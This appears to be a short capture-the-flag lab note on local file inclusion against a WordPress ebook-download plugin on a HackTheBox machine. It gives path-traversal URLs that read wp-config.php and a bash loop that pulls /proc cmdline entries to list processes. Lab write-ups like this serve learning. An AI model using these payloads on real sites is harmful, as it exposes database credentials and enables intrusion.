---
title: "LFI"
date: 2022-05-04T13:03:15+02:00
---

# LFI
 ## General info
Some LFI will look like so : 
`http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`

Sometimes, the several '../../../' can be translated to : //, eg. :

`http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=//wp-config.php`

This is better looking, and shorter...

In this case, the LFI can also be used to get a list of all running process by using the info from the `/proc` filesytem. However, since the LFI return "entire" PHP code, it means we won't be able to execute any code.

## Get the list of running processes

```
for i in $(seq 0 2000); do echo -n "$i: "; curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=//proc/$i/cmdline" --output -; echo; done | tee pid.lst
```


We write the first 2000 processes into `pid.lst`.